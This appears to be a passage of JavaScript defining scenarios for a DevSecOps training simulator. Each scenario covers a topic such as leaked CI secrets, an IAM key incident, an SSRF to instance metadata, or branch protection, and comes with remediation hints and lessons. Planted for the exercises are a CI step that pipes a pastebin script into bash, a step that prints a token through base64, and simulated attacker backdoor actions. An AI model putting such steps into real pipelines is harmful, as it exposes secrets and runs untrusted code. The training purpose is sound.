      tries: ["gh secret list", "aws iam list-access-keys --user-name fernleaf-ci"]
    },
    {
      id: "log-leak", group: "CI/CD and supply chain", level: "09", title: "Secret printed in CI logs",
      story: "While debugging an index error, someone added a step that prints the token through base64. GitHub masks the exact secret, not encodings of it, so the last run's log holds it.",
      goal: "Remove the step, rotate the token, and delete the runs whose logs hold it.",
      setup(s) {
        s.commit("Debug index auth", { ".github/workflows/ci.yml": s.edit(".github/workflows/ci.yml", "      - name: Secret scan (gitleaks, full history)", "      - name: Debug index auth\n        env:\n          PIP_TOKEN: ${{ secrets.PIP_TOKEN }}\n        run: echo \"$PIP_TOKEN\" | base64\n      - name: Secret scan (gitleaks, full history)") }, { daysAgo: 1, push: true });
        pipeline(s);
        s.leakedToken = s.gh.secrets.PIP_TOKEN;
      },
      checks: [
        ["The debug step is gone", (s) => !s.workflows(s.head().tree).some((f) => f.id === "secret-printed")],
        ["The token was rotated and CI has the new one", (s) => s.rotated("ci/pip-token") && s.ghSecretCurrent()],
        ["No run log holds the old token", (s) => !s.gh.runs.some((r) => r.log.some((l) => l.includes(btoa(s.leakedToken + "\n"))))],
        PASSES, INTACT
      ],
      hints: [
        "gh run list, then gh run view <id> --log | grep -A1 base64. echo <value> | base64 -d shows what anyone with read access can see.",
        "Rotate first: aws secretsmanager rotate-secret --secret-id ci/pip-token, then gh secret set PIP_TOKEN --body \"$(aws secretsmanager get-secret-value --secret-id ci/pip-token --query SecretString --output text)\".",
        "Remove the step (git checkout HEAD~1 -- .github/workflows/ci.yml), commit, gh run delete <id> for the leaking run, pipeline."
      ],
      lesson: "Masking hides exact matches only. Never print secrets, transformed or not; when it happens, rotate and remove the logs.",
      tries: ["gh run list", "zizmor .github/workflows/"]
    },
    {
      id: "trivy-ratelimit", group: "CI/CD and supply chain", level: "11", title: "Scanner database rate limited",
      story: "Since this morning every pipeline fails in the licence and vulnerability step: trivy cannot download its database from ghcr.io (TOOMANYREQUESTS). The step pins --db-repository to ghcr.io.",
      goal: "Get the scan working again without turning it off.",
      setup(s) {
        s.trivyGhcrLimited = true;
        s.commit("Scan dependencies with trivy too", { ".github/workflows/ci.yml": s.edit(".github/workflows/ci.yml", "run: trivy fs --scanners license --exit-code 1 .", "run: trivy fs --scanners vuln,license --db-repository ghcr.io/aquasecurity/trivy-db:2 --exit-code 1 .") }, { daysAgo: 10, push: true });
      },
      checks: [["trivy downloads its database from a mirror (mirror.gcr.io or public.ecr.aws)", (s) => { const m = /trivy fs[^\n]*/.exec(head(s, ".github/workflows/ci.yml")); return !!m && (!/--db-repository/.test(m[0]) || /mirror\.gcr\.io|public\.ecr\.aws/.test(m[0])); }], PASSES, INTACT],
      hints: [
        "pipeline shows the error. trivy fs --scanners vuln --db-repository ghcr.io/aquasecurity/trivy-db:2 . reproduces it; without the flag it works.",
        "continue-on-error turns the scan off; --skip-db-update fails on a fresh runner. Point trivy at a mirror, and cache the database between runs.",
        "sed -i 's#ghcr.io/aquasecurity/trivy-db:2#mirror.gcr.io/aquasec/trivy-db:2,public.ecr.aws/aquasecurity/trivy-db:2#' .github/workflows/ci.yml, commit, pipeline."
      ],
      lesson: "Scanners are dependencies too: they need mirrors, caches and timeouts like everything else, or one rate limit stops every release.",
      tries: ["pipeline", "trivy fs --scanners vuln --db-repository ghcr.io/aquasecurity/trivy-db:2 ."]
    },

    // --- Runtime and response ---
    {
      id: "leaked-token", group: "Runtime and response", level: "13", title: "Incident: leaked key used by an attacker",
      story: "GitHub secret scanning alerted on a public gist: an access key of the IAM user reports-export. Billing shows new instances in us-east-2. The key has been used.",
      goal: "Contain it: stop the key, find what it did, and remove what the attacker left behind.",
      setup(s) {
        s.aws.users["reports-export"] = { policies: ["fernleaf-reports-read", "IAMFullAccess"] };
        s.aws.users["backup-svc"] = { policies: ["AdministratorAccess"], created: NOW - 0.2 * DAY };
        s.addKey("reports-export", INCIDENT_KEY, "PRACTICE/rx/0nlyF0rTr4iningNotReal+K3y0", { lastUsed: NOW - 600000 });
        s.addKey("backup-svc", BACKDOOR_KEY, "PRACTICE/bk/0nlyF0rTr4iningNotReal+K3y0", { created: NOW - 0.2 * DAY });
        s.aws.instances = { "i-0f3c9a1b7d2e4c8a1": { region: "us-east-2", type: "c6i.8xlarge", state: "running", launched: NOW - 0.15 * DAY }, "i-07b2e9d4a6c1f3e58": { region: "us-east-2", type: "c6i.8xlarge", state: "running", launched: NOW - 0.15 * DAY } };
        const ev = (name, t, extra) => ({ name, time: NOW - t * 3600000, user: "reports-export", key: INCIDENT_KEY, ip: "203.0.113.77", source: "iam.amazonaws.com", global: true, ...extra });
        s.aws.trail = [ev("GetCallerIdentity", 5.5, { source: "sts.amazonaws.com" }), ev("ListBuckets", 5.4, { source: "s3.amazonaws.com" }), ev("CreateUser", 5.1, { resources: [{ ResourceType: "AWS::IAM::User", ResourceName: "backup-svc" }] }),
          ev("AttachUserPolicy", 5.0, { resources: [{ ResourceType: "AWS::IAM::Policy", ResourceName: "arn:aws:iam::aws:policy/AdministratorAccess" }] }), ev("CreateAccessKey", 4.9, { resources: [{ ResourceType: "AWS::IAM::AccessKey", ResourceName: BACKDOOR_KEY }] }),
          ev("RunInstances", 3.6, { source: "ec2.amazonaws.com", global: false, region: "us-east-2", resources: [{ ResourceType: "AWS::EC2::Instance", ResourceName: "i-0f3c9a1b7d2e4c8a1" }, { ResourceType: "AWS::EC2::Instance", ResourceName: "i-07b2e9d4a6c1f3e58" }] })];
      },
      checks: [
        ["The leaked key is deactivated or deleted", (s) => !s.keyActive(INCIDENT_KEY)],
        ["You read what the key did in CloudTrail", (s) => !!s.investigated.trailKey],
        ["The backdoor user it created is deleted", (s) => !s.aws.users["backup-svc"]],
        ["The instances it launched are terminated", (s) => Object.values(s.aws.instances).every((i) => i.state === "terminated")]
      ],
      hints: [
        "Contain first: aws iam update-access-key --user-name reports-export --access-key-id AKIAPRACTICE3MNB5VXR --status Inactive.",
        "Then scope: aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAPRACTICE3MNB5VXR (and again with --region us-east-2). Attackers create persistence first.",
        "Remove it: delete backup-svc's key (aws iam delete-access-key --user-name backup-svc --access-key-id AKIAPRACTICE5BKDR7ZS), aws iam detach-user-policy --user-name backup-svc --policy-arn arn:aws:iam::aws:policy/AdministratorAccess, aws iam delete-user --user-name backup-svc, and aws ec2 terminate-instances --region us-east-2 --instance-ids i-0f3c9a1b7d2e4c8a1 i-07b2e9d4a6c1f3e58."
      ],
      lesson: "Contain, scope, eradicate: deactivate the key, read CloudTrail for everything it did, then remove each thing it created. Deleting only the leaked key leaves the attacker's own key working.",
      tries: ["aws iam list-access-keys --user-name reports-export", "aws iam list-users"]
    },
    {
      id: "dast-headers", group: "Runtime and response", level: "12", title: "DAST: missing security headers",
      story: "The ZAP baseline against staging fails on four alerts: no CSP, no HSTS, no X-Content-Type-Options, no anti-clickjacking header. A refactor removed the after_request hook.",
      goal: "Send the headers from the app and pass DAST.",
      setup(s) {
        s.commit("Tidy main.py", { "app/main.py": s.read("app/main.py").replace(/@app\.after_request[\s\S]*?return resp\n\n\n/, "") }, { daysAgo: 2, push: true });
        pipeline(s);
      },
      checks: [["Staging sends CSP, HSTS, X-Content-Type-Options and X-Frame-Options", (s) => Object.values(s.staging().headers).every(Boolean)], PASSES, INTACT],
      hints: [
        "curl -sI https://staging.fernleaf.example/ and zap-baseline.py -t https://staging.fernleaf.example -c .zap/rules.tsv.",
        "Setting the rules to WARN or IGNORE in .zap/rules.tsv only hides them. Bring back the hook.",
        "git checkout HEAD~1 -- app/main.py restores security_headers(). Commit, pipeline (it deploys, then runs ZAP)."
      ],
      lesson: "DAST tests the running app the way a browser sees it, finding what code scanners cannot: configuration and headers (OWASP ASVS covers them in its HTTP security requirements).",
      tries: ["curl -sI https://staging.fernleaf.example/", "zap-baseline.py -t https://staging.fernleaf.example -c .zap/rules.tsv"]
    },
    {
      id: "cve-in-prod", group: "Runtime and response", level: "12", title: "New critical CVE in production",
      story: "A critical advisory (PRACTICE-2026-0058, remote code execution in quickcache before 3.4.1) was published this morning. Last week's release passed every gate. Is it running, and where?",
      goal: "Confirm from the SBOM, patch, and release.",
      setup(s) {
        s.commit("Lock quickcache", relock(s, D.FILES["requirements.in"], pins({ quickcache: "3.4.0" })), { daysAgo: 7, push: true });
        pipeline(s);
        s.newAdvisories = true;
      },
      checks: [["Staging runs quickcache 3.4.1 or later", (s) => !!release(s) && atLeast((release(s).image.pins.quickcache || {}).version, "3.4.1")], PASSES, INTACT],
      hints: [
        "You do not need to rebuild to know: grype sbom:./sbom.cdx.json (the last release's SBOM) answers in seconds.",
        "Re-running the pipeline rebuilds the same version. Upgrade the package.",
        "pip-compile --upgrade-package quickcache requirements.in, git commit -am \"Upgrade quickcache\", pipeline."
      ],
      lesson: "Shift right complements shift left: new advisories arrive after release, and SBOMs plus continuous scanning tell you where you are exposed.",
      tries: ["grype sbom:./sbom.cdx.json", "osv-scanner scan source -r ."]
    },
    {
      id: "tf-state", group: "Secrets", level: "07", title: "Secrets in Terraform state",
      story: "gitleaks flags terraform/terraform.tfstate: someone committed the local state file, and state holds every attribute in plain text, including the database password the module set from a variable.",
      goal: "Get state out of git and into an encrypted remote backend, purge it from history, and rotate the password.",
      setup(s) {
        const state = JSON.stringify({ version: 4, terraform_version: "1.9.8", serial: 41, lineage: "8f0c2a6e-practice", resources: [{ mode: "managed", type: "aws_db_instance", name: "orders", provider: "provider[\"registry.terraform.io/hashicorp/aws\"]",
          instances: [{ attributes: { identifier: "fernleaf-orders", engine: "postgres", username: "orders", password: DB_PW, storage_encrypted: true } }] }] }, null, 2) + "\n";
        s.commit("Save Terraform state", { "terraform/terraform.tfstate": state }, { daysAgo: 8, push: true });
      },
      checks: [
        ["terraform.tfstate is untracked and .gitignore covers *.tfstate", (s) => !s.tracked("terraform/terraform.tfstate") && S.ignored(s.gitignore(), "terraform/terraform.tfstate")],
        ["State lives in an encrypted S3 backend", (s) => { const b = R.parseHcl(head(s, "terraform/main.tf")).find((x) => x.type === "terraform"); const be = b && b.blocks.find((x) => x.type === "backend" && x.labels[0] === "s3"); return !!be && be.attrs.encrypt && be.attrs.encrypt.value === true; }],
        ["The database password was rotated", (s) => s.rotated("prod/orders/db")],
        ["The state file is gone from every commit on GitHub", (s) => s.pushed() && !s.remoteHasPath("terraform/terraform.tfstate")],
        PASSES, INTACT
      ],
      hints: [
        "git log --stat -- terraform/terraform.tfstate, then grep -n password terraform/terraform.tfstate. Sensitive values are hidden in plan output, not in state.",
        "Rotate first (aws secretsmanager rotate-secret --secret-id prod/orders/db), then git rm --cached terraform/terraform.tfstate and echo '*.tfstate*' >> .gitignore. Add a backend to terraform/main.tf: terraform { backend \"s3\" { bucket = \"fernleaf-tfstate\" key = \"api/terraform.tfstate\" region = \"eu-west-1\" encrypt = true use_lockfile = true } }.",
        "Commit, then git filter-repo --path terraform/terraform.tfstate --invert-paths --force, git remote add origin git@github.com:fernleaf/api.git, git push --force origin main, pipeline."
      ],
      lesson: "Terraform state is a secret store whether you want it to be or not. Keep it in an encrypted, access-controlled backend, never in git, and let RDS manage the password (manage_master_user_password).",
      tries: ["gitleaks git -v", "git log --stat -- terraform/terraform.tfstate"]
    },
    {
      id: "imdsv1", group: "Infrastructure as code", level: "07", title: "IMDSv1 and an SSRF",
      story: "A bug bounty report: the PDF worker fetches any URL a customer embeds, and http://169.254.169.254/latest/meta-data/iam/security-credentials/ returned the instance role's keys. The worker's launch config still allows IMDSv1.",
      goal: "Require IMDSv2 on the worker so a plain SSRF cannot read instance credentials.",
      setup(s) {
        s.commit("PDF render workers", { "terraform/main.tf": s.read("terraform/main.tf") + `\nresource "aws_instance" "pdf_worker" {\n  ami           = var.worker_ami\n  instance_type = "t3.small"\n  iam_instance_profile = "fernleaf-pdf-worker"\n  metadata_options {\n    http_endpoint = "enabled"\n    http_tokens   = "optional"\n  }\n}\n` }, { daysAgo: 40, push: true });
      },
      checks: [["Instances require IMDSv2 (http_tokens = \"required\")", (s) => !tfIds(s).includes("CKV_AWS_79") && /aws_instance/.test(head(s, "terraform/main.tf"))], PASSES, INTACT],
      hints: [
        "checkov -d terraform names CKV_AWS_79 and the resource.",
        "IMDSv2 needs a PUT to get a session token first, which a simple SSRF (a GET to a URL you control) cannot do. Turning the metadata endpoint off would break the instance role.",
        "sed -i 's/http_tokens   = \"optional\"/http_tokens   = \"required\"/' terraform/main.tf, commit, pipeline. Also rotate: the role's temporary credentials expire on their own, but check CloudTrail for their use."
      ],
      lesson: "IMDSv2 turns a common SSRF into a non-event. Require it everywhere (launch templates, account default) and fix the SSRF itself with an allowlist of hosts.",
      tries: ["checkov -d terraform", "grep -n -A3 metadata_options terraform/main.tf"]
    },
    {
      id: "branch-protection", group: "CI/CD and supply chain", level: "09", title: "Branch protection bypassed",
      story: "A commit reached main with no pull request: an admin pushed \"Speed up CI\", which pipes a script from a pastebin into bash. Someone had relaxed branch protection to fix a release on Friday: no reviews, admins exempt, force pushes allowed.",
      goal: "Take the unreviewed change out and restore protection from the reviewed policy in docs/branch-protection.json.",
      setup(s) {
        s.gh.protection = { reviews: 0, codeOwners: false, dismissStale: false, enforceAdmins: false, forcePushes: true, deletions: false, checks: [] };
        s.commit("Document branch protection", { "docs/branch-protection.json": JSON.stringify({ required_status_checks: { strict: true, contexts: ["scan", "build"] }, enforce_admins: true,
          required_pull_request_reviews: { required_approving_review_count: 1, require_code_owner_reviews: true, dismiss_stale_reviews: true }, restrictions: null, allow_force_pushes: false, allow_deletions: false }, null, 2) + "\n" }, { daysAgo: 90 });
        s.commit("Speed up CI", { ".github/workflows/ci.yml": s.edit(".github/workflows/ci.yml", "      - uses: ./.github/actions/install-tools\n      - name: Secret scan", "      - uses: ./.github/actions/install-tools\n      - name: Warm the cache\n        run: curl -fsSL https://paste.example.net/raw/x9Qe1 | bash\n      - name: Secret scan") }, { daysAgo: 1, push: true, author: { name: "Release Admin", email: "admin@fernleaf.example" } });
      },
      checks: [
        ["The unreviewed script download is gone from ci.yml", (s) => !s.workflows(s.head().tree).some((f) => f.id === "curl-pipe-shell")],
        ["main needs a code-owner review and the scan and build checks", (s) => { const p = s.gh.protection; return p.reviews >= 1 && p.codeOwners && ["scan", "build"].every((c) => p.checks.includes(c)); }],
        ["Admins are not exempt and force pushes are off", (s) => s.gh.protection.enforceAdmins && !s.gh.protection.forcePushes],
        PASSES, INTACT
      ],
      hints: [
        "git log --oneline -n 3 and git show HEAD: who pushed what? gh api repos/fernleaf/api/branches/main/protection shows the rules today.",
        "Revert, do not rewrite: git revert <sha> keeps the record of what happened. Then put back the reviewed policy: gh api -X PUT repos/fernleaf/api/branches/main/protection --input docs/branch-protection.json",
        "Requiring reviews while enforce_admins is false still lets admins push straight to main. After the PUT, git push and pipeline."
      ],
      lesson: "Branch protection (or rulesets) is a security control: required reviews, required checks, no force pushes, and no exemption for admins. Keep the policy in code and alert on changes to it.",
      tries: ["git log --oneline -n 3", "gh api repos/fernleaf/api/branches/main/protection"]
    },
    {
      id: "dependabot", group: "Dependencies", level: "04", title: "Dependabot triage and safe auto-merge",
      story: "Four Dependabot pull requests are open, one of them the fix for a critical advisory. The auto-merge workflow someone copied merges any pull request at all, from anyone, before checks finish, majors included, on pull_request_target.",
      goal: "Merge the security fix, leave the breaking major for a human, and make auto-merge safe.",
      setup(s) {
        s.commit("Pin imgresize for the thumbnail bug", relock(s, s.edit("requirements.in", "imgresize\n", "imgresize==2.1.0\n")), { daysAgo: 20 });
        s.commit("Auto-merge bot pull requests", { ".github/workflows/dependabot-automerge.yml": `name: dependabot-automerge

on: pull_request_target

permissions:
  contents: write
  pull-requests: write

jobs:
  automerge:
    runs-on: ubuntu-latest
    steps:
      - name: Merge the pull request
        env:
          PR_URL: \${{ github.event.pull_request.html_url }}
          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
        run: gh pr merge --merge "$PR_URL"
` }, { daysAgo: 14, push: true });
        const pr = (n, pkg, from, to, kind, body) => ({ n, pkg, from, to, kind, state: "OPEN", title: `Bump ${pkg} from ${from} to ${to}`, body });
        s.gh.prs = [pr(101, "imgresize", "2.1.0", "2.1.4", "patch", "Fixes PRACTICE-2026-0001 (critical, path traversal). Release notes: security fix only."),
          pr(102, "quickcache", "3.4.0", "3.4.1", "patch", "Bug fixes."),
          pr(104, "plotkit", "1.6.0", "2.0.0", "major", "BREAKING: Chart.render() removed; use Chart.to_png(). Version 2.0.0.")];
      },
      checks: [
        ["The security fix is merged: imgresize 2.1.4", (s) => atLeast(lockPin(s, "imgresize"), "2.1.4")],
        ["The breaking plotkit 2.0 is not merged", (s) => S.cmpVer(lockPin(s, "plotkit") || "0", "2") < 0],
        ["Auto-merge runs on pull_request, only for dependabot[bot], never for majors, and waits for checks (--auto)", (s) => {
          const t = head(s, ".github/workflows/dependabot-automerge.yml");
          return !!t && !/pull_request_target/.test(t) && /dependabot\[bot\]/.test(t) && /semver-major/.test(t) && /gh pr merge --auto/.test(t);
        }],
        PASSES, INTACT
      ],
      hints: [
        "gh pr list, then gh pr view 101 and gh pr view 104. Which one is a security fix, which one breaks the API?",
        "gh pr merge 101 --squash lands the security fix on main (it is already in your local history here). Leave 104 for a person: it changes an API the reports use.",
        "Rewrite .github/workflows/dependabot-automerge.yml (edit it): on: pull_request; job if: github.event.pull_request.user.login == 'dependabot[bot]'; a step uses: dependabot/fetch-metadata@25dd0e34f4fe68f24cc83900b1fe3fe149efef98 # v3.1.0 with id: meta; the merge step if: steps.meta.outputs.update-type != 'version-update:semver-major' and run: gh pr merge --auto --squash \"$PR_URL\"; permissions contents: write and pull-requests: write on the job only. Commit, pipeline."
      ],
      lesson: "Auto-merge is safe when it is narrow: only the bot, only patch and minor, only after required checks pass (--auto), with branch protection behind it. Security fixes get merged first; majors get a person.",
      tries: ["gh pr list", "cat .github/workflows/dependabot-automerge.yml"]
    },
    {
      id: "vex", group: "Containers", level: "11", title: "VEX for a non-exploitable CVE",
      story: "The image scan blocks the release on PRACTICE-2026-0140 (HIGH, no fix yet) in libpractice-glyphs2, a font library the base image ships. The API never renders text to images; nothing calls it. Security agrees it is not exploitable here.",
      goal: "Record that decision as an OpenVEX statement the scanner reads, so the gate passes for this CVE only.",
      setup(s) {
        s.extraOsVulns = [["libpractice-glyphs2", "2.13.1-1", "PRACTICE-2026-0140", "HIGH", null, "practice-glyphs: heap overflow when rendering crafted fonts"]];
        s.commit("Release 1.5", { "README.md": s.read("README.md") + "\nRelease 1.5: catalogue imports.\n" }, { daysAgo: 0, push: true });
      },
      checks: [
        ["vex.openvex.json marks PRACTICE-2026-0140 not_affected, with a justification and an impact statement", (s) => s.vexNotAffected(s.head().tree, "vex.openvex.json").includes("PRACTICE-2026-0140")],
        ["The image scan reads it (trivy image --vex)", (s) => /trivy image[^\n]*--vex[ =]vex\.openvex\.json/.test(head(s, ".github/workflows/ci.yml"))],
        PASSES, INTACT
      ],
      hints: [
        "pipeline shows the finding; trivy image --severity HIGH,CRITICAL ghcr.io/fernleaf/api:1.0.0 after a docker build shows the package.",
        "--ignore-unfixed would hide every future unfixed CVE too. A VEX statement is scoped to one vulnerability and one product, with a reason others can audit.",
        "Create vex.openvex.json (echo '{}' > vex.openvex.json, then edit it) with @context https://openvex.dev/ns/v0.2.0, author, timestamp and one statement: vulnerability name PRACTICE-2026-0140, products [{\"@id\": \"pkg:oci/api?repository_url=ghcr.io/fernleaf/api\"}], status not_affected, justification vulnerable_code_not_in_execute_path, impact_statement explaining why. Add --vex vex.openvex.json to the trivy image line in ci.yml. git add, commit, pipeline."
      ],
      lesson: "VEX (Vulnerability Exploitability eXchange) says, in a machine-readable way, whether a known vulnerability affects your product and why. Scanners such as Trivy apply it, so the decision travels with the image.",
      tries: ["pipeline", "trivy image --severity HIGH,CRITICAL ghcr.io/fernleaf/api:1.0.0"]
    },
    {
      id: "tag-mutability", group: "CI/CD and supply chain", level: "10", title: "Mutable tags and digest pinning",
      story: "Staging changed with no deploy: someone pushed ghcr.io/fernleaf/api:stable from a branch build and the Pods picked it up on restart. The policy no longer pins Pods to the verified digest; mutateDigest and verifyDigest were switched off to quiet a GitOps diff.",
      goal: "Make the cluster run exactly the digest that was verified, and deploy by digest.",
      setup(s) {
        s.commit("Deploy the stable tag; stop rewriting images", {
          "k8s/verify-images.yaml": s.edit("k8s/verify-images.yaml", "        - imageReferences:\n            - \"ghcr.io/fernleaf/*\"\n", "        - imageReferences:\n            - \"ghcr.io/fernleaf/*\"\n          mutateDigest: false\n          verifyDigest: false\n"),
          ".github/workflows/ci.yml": s.edit(".github/workflows/ci.yml", "kubectl -n shop set image deployment/api api=ghcr.io/fernleaf/api:${{ github.sha }}", "kubectl -n shop set image deployment/api api=ghcr.io/fernleaf/api:stable")
        }, { daysAgo: 5, push: true });
      },
      checks: [
        ["The policy verifies and pins digests (verifyDigest and mutateDigest not false)", (s) => !/(mutateDigest|verifyDigest):\s*false/.test(head(s, "k8s/verify-images.yaml"))],
        ["CI deploys the commit's image, not a floating tag", (s) => /set image deployment\/api api=ghcr\.io\/fernleaf\/api(@\$\{\{|:\$\{\{ github\.sha \}\})/.test(head(s, ".github/workflows/ci.yml"))],
        PASSES, INTACT
      ],
      hints: [
        "grep -n set image .github/workflows/ci.yml and cat k8s/verify-images.yaml. A tag is a pointer anyone with push access can move.",
        "Kyverno's verifyImages checks the signature of the digest and, with mutateDigest, rewrites the Pod to that digest, so a later push to the tag changes nothing. Both default to true; delete the two lines.",
        "sed -i '/Digest: false/d' k8s/verify-images.yaml and sed -i 's/api:stable/api:${{ github.sha }}/' .github/workflows/ci.yml (or deploy @${{ steps.push.outputs.digest }}). Commit, pipeline."
      ],
      lesson: "Tags move; digests do not. Deploy and verify by digest, and use immutable tags where the registry supports them (for example ECR's IMMUTABLE setting).",
      tries: ["grep -n 'set image' .github/workflows/ci.yml", "cat k8s/verify-images.yaml"]
    }
  ];

  const ORDER = ["Secrets", "Dependencies", "Code", "Containers", "Infrastructure as code", "Kubernetes", "CI/CD and supply chain", "Runtime and response"];
  SCENARIOS.sort((a, b) => ORDER.indexOf(a.group) - ORDER.indexOf(b.group));
  const GROUPS = [];
  for (const s of SCENARIOS) {
    let g = GROUPS.find((x) => x[0] === s.group);
    if (!g) GROUPS.push(g = [s.group, []]);
    g[1].push(s.id);
  }
  for (const s of SCENARIOS) s.won = (sim) => s.checks.every(([, fn]) => fn(sim));

  root.DSScenarios = { SCENARIOS, GROUPS, AWS_KEY, AWS_SECRET, INCIDENT_KEY, BACKDOOR_KEY, CI_KEY, GH_PAT, DB_PW };
})(typeof window !== "undefined" ? window : globalThis);
